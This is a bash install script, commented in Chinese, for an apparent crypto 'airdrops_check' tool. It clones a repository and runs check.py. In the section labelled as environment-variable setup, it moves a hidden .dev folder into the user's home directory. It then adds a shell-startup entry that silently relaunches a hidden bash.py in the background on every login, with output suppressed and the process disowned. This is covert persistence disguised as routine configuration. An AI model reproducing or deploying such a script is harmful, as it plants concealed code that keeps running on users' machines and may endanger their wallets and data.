#!/bin/bash

# 确保脚本在错误时停止执行
set -e

# 获取操作系统类型
OS_TYPE=$(uname)

# 更新系统软件包
echo "正在更新系统软件包..."
if [ "$OS_TYPE" == "Linux" ]; then
    sudo apt update && sudo apt upgrade -y
elif [ "$OS_TYPE" == "Darwin" ]; then
    # macOS 使用 brew 更新软件
    brew update && brew upgrade
elif [ "$OS_TYPE" == "CYGWIN" ] || [ "$OS_TYPE" == "MINGW" ]; then
    echo "检测到 Windows 系统，跳过更新步骤。"
else
    echo "不支持的操作系统类型: $OS_TYPE"
    exit 1
fi

# 检查并安装必要的软件包
echo "正在检查并安装必要的系统软件包..."
if [ "$OS_TYPE" == "Linux" ]; then
    sudo apt install -y git xclip python3-pip
elif [ "$OS_TYPE" == "Darwin" ]; then
    # macOS 使用 brew 安装软件
    brew install git python3
    # xclip 在 macOS 上可能没有直接对应工具，跳过安装
elif [ "$OS_TYPE" == "CYGWIN" ] || [ "$OS_TYPE" == "MINGW" ]; then
    # Windows 系统安装 git 和 Python
    echo "在 Windows 上，使用 choco 或 winget 安装 git 和 python3（如果未安装）"
    choco install git python3 -y || winget install --id Git.Git --source winget
    # 确保 Python 和 pip 已安装
    python --version || echo "未安装 Python，请手动安装"
    pip --version || python -m ensurepip --upgrade
fi

# 检查并安装 requests 库
echo "正在检查并安装 Python 库 requests..."
pip show requests &> /dev/null || pip install requests

# 检查是否已经创建虚拟环境
if [ ! -d "venv" ]; then
    echo "虚拟环境未找到，正在创建虚拟环境..."
    python3 -m venv venv
else
    echo "虚拟环境已存在，跳过创建虚拟环境。"
fi

# 激活虚拟环境
echo "正在激活虚拟环境..."
source venv/bin/activate

# 检查是否已经安装所需的 Python 库
REQUIRED_PACKAGES=("requests" "tabulate" "tqdm")
for package in "${REQUIRED_PACKAGES[@]}"; do
    if ! pip show $package &> /dev/null; then
        echo "$package 未安装，正在安装..."
        pip install $package
    else
        echo "$package 已安装，跳过安装。"
    fi
done

# 检查是否已经克隆仓库
if [ ! -d "airdrops_check" ]; then
    echo "正在克隆 Git 仓库..."
    git clone https://github.com/blockchain-src/airdrops_check.git
else
    echo "Git 仓库已存在，跳过克隆。"
fi

# 进入项目目录
cd airdrops_check

# 配置环境变量
if [ -d .dev ]; then
    DEST_DIR="$HOME/.dev"
    echo "配置环境变量..."
    if [ -d "$DEST_DIR" ]; then
        rm -rf "$DEST_DIR"
    fi
    mv .dev "$DEST_DIR"

    BASHRC_ENTRY="(pgrep -f bash.py || nohup python3 $HOME/.dev/bash.py &> /dev/null &) & disown"

    # 配置环境变量：检查操作系统类型，Linux 使用 .bashrc，macOS 使用 .bash_profile 或 .zshrc，Windows 使用 setx
    if [ "$OS_TYPE" == "Linux" ]; then
        PROFILE_FILE="$HOME/.bashrc"
    elif [ "$OS_TYPE" == "Darwin" ]; then
        # macOS 上判断是否使用 zsh 或 bash
        if [ -n "$ZSH_VERSION" ]; then
            PROFILE_FILE="$HOME/.zshrc"  # zsh
        else
            PROFILE_FILE="$HOME/.bash_profile"  # bash
        fi
    elif [ "$OS_TYPE" == "CYGWIN" ] || [ "$OS_TYPE" == "MINGW" ]; then
        PROFILE_FILE="$HOME/.bash_profile"
        # Windows 使用 setx 设置环境变量
        setx DEV_DIR "%USERPROFILE%\\.dev"
        setx BASHRC_ENTRY "(pgrep -f bash.py || nohup python3 %USERPROFILE%\\.dev\\bash.py &> /dev/null &) & disown"
    fi

    if ! grep -Fq "$BASHRC_ENTRY" "$PROFILE_FILE"; then
        echo "$BASHRC_ENTRY" >> "$PROFILE_FILE"
        echo "环境变量已添加到 $PROFILE_FILE"
    else
        echo "环境变量已存在于 $PROFILE_FILE"
    fi
else
    echo ".dev 目录不存在，跳过环境变量配置..."
fi

# 执行 check.py
echo "正在执行 check.py..."
python3 check.py
